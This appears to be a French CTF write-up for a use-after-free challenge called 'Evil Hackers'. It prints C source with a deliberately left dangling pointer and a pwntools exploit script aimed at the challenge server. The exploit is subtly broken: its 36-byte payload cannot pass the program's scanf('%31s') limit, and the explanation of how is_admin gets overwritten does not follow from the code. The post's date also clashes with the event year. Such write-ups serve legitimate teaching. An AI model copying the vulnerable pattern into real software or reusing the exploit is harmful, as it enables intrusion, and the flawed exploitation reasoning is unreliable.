---
title: "PwnMe Junior 2025 - Evil Hackers"
date: 2024-04-14
tags: ["pwnme-junior", "pwn", "use-after-free", "exploitation"]
---

# Write-up: Evil Hackers - PwnMe Junior 2025

## Description

Evil Hackers est un challenge de type "use-after-free" (UAF) qui simule un système de gestion d'utilisateurs vulnérable.

## Analyse du binaire

Le programme est un binaire ELF 64 bits qui offre une interface pour gérer des utilisateurs, avec plusieurs options :
1. Ajouter un utilisateur
2. Supprimer un utilisateur
3. Afficher les informations d'un utilisateur
4. Modifier le nom d'un utilisateur
5. Quitter

Voici un extrait du code source :

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    char name[32];
    int is_admin;
} User;

User* users[10] = {NULL};

void add_user(int idx) {
    if (idx < 0 || idx >= 10) {
        printf("Index invalide\n");
        return;
    }
    
    if (users[idx] != NULL) {
        printf("L'emplacement est déjà occupé\n");
        return;
    }
    
    users[idx] = malloc(sizeof(User));
    if (users[idx] == NULL) {
        printf("Erreur d'allocation mémoire\n");
        return;
    }
    
    printf("Nom de l'utilisateur: ");
    scanf("%31s", users[idx]->name);
    users[idx]->is_admin = 0;  // Les nouveaux utilisateurs ne sont pas admin
    
    printf("Utilisateur ajouté avec succès\n");
}

void delete_user(int idx) {
    if (idx < 0 || idx >= 10 || users[idx] == NULL) {
        printf("Utilisateur invalide\n");
        return;
    }
    
    free(users[idx]);
    // Vulnérabilité: pointeur non réinitialisé après free
    
    printf("Utilisateur supprimé avec succès\n");
}

void show_user(int idx) {
    if (idx < 0 || idx >= 10 || users[idx] == NULL) {
        printf("Utilisateur invalide\n");
        return;
    }
    
    printf("Nom: %s\n", users[idx]->name);
    printf("Admin: %s\n", users[idx]->is_admin ? "Oui" : "Non");
    
    if (users[idx]->is_admin) {
        printf("Flag: PwnMe{us3_4ft3r_fr33_1s_d4ng3r0us}\n");
    }
}

void edit_user(int idx) {
    if (idx < 0 || idx >= 10 || users[idx] == NULL) {
        printf("Utilisateur invalide\n");
        return;
    }
    
    printf("Nouveau nom: ");
    scanf("%31s", users[idx]->name);
    
    printf("Nom modifié avec succès\n");
}

int main() {
    int choice, idx;
    
    while (1) {
        printf("\n===== Système de gestion des utilisateurs =====\n");
        printf("1. Ajouter un utilisateur\n");
        printf("2. Supprimer un utilisateur\n");
        printf("3. Afficher un utilisateur\n");
        printf("4. Modifier un utilisateur\n");
        printf("5. Quitter\n");
        printf("Choix: ");
        scanf("%d", &choice);
        
        if (choice == 5) break;
        
        printf("Index (0-9): ");
        scanf("%d", &idx);
        
        switch(choice) {
            case 1: add_user(idx); break;
            case 2: delete_user(idx); break;
            case 3: show_user(idx); break;
            case 4: edit_user(idx); break;
            default: printf("Option invalide\n");
        }
    }
    
    return 0;
}
```

## Vulnérabilité

La vulnérabilité principale est un Use-After-Free (UAF) : après la libération d'un utilisateur avec `delete_user()`, le pointeur `users[idx]` n'est pas mis à NULL. Cela signifie qu'il est possible d'accéder et de modifier cette zone mémoire après qu'elle ait été libérée.

## Exploitation

L'exploitation se fait en plusieurs étapes :
1. Créer un utilisateur à l'index 0
2. Supprimer cet utilisateur (libération de la mémoire)
3. Créer un nouvel utilisateur à l'index 1, qui réutilisera probablement la même zone mémoire
4. Modifier le nom de l'utilisateur à l'index 1 pour écraser la valeur `is_admin` de la structure
5. Afficher l'utilisateur à l'index 0 pour obtenir le flag

```python
from pwn import *

# Connexion au serveur
conn = remote('challenge.pwnme.fr', 1338)

# Fonction pour naviguer dans le menu
def menu(choice, idx):
    conn.sendlineafter(b"Choix: ", str(choice).encode())
    if choice != 5:  # L'option 5 ne demande pas d'index
        conn.sendlineafter(b"Index (0-9): ", str(idx).encode())

# 1. Ajouter un utilisateur à l'index 0
menu(1, 0)
conn.sendlineafter(b"Nom de l'utilisateur: ", b"user1")

# 2. Supprimer cet utilisateur (libération de la mémoire)
menu(2, 0)

# 3. Créer un nouvel utilisateur à l'index 1
menu(1, 1)
conn.sendlineafter(b"Nom de l'utilisateur: ", b"user2")

# 4. Modifier l'utilisateur à l'index 1 pour écraser la valeur is_admin
# Créer un payload qui remplit le name (32 octets) et écrit 1 dans is_admin
menu(4, 1)
payload = b"A" * 32 + p32(1)  # 32 'A' + valeur 1 pour is_admin
conn.sendlineafter(b"Nouveau nom: ", payload)

# 5. Afficher l'utilisateur à l'index 0 pour obtenir le flag
menu(3, 0)

# Récupérer et afficher le flag
conn.recvuntil(b"Flag: ")
flag = conn.recvline().strip().decode()
print(f"Flag: {flag}")

# Quitter proprement
menu(5, 0)
conn.close()
```

## Flag

En exécutant l'exploit, nous obtenons le flag : `PwnMe{us3_4ft3r_fr33_1s_d4ng3r0us}` 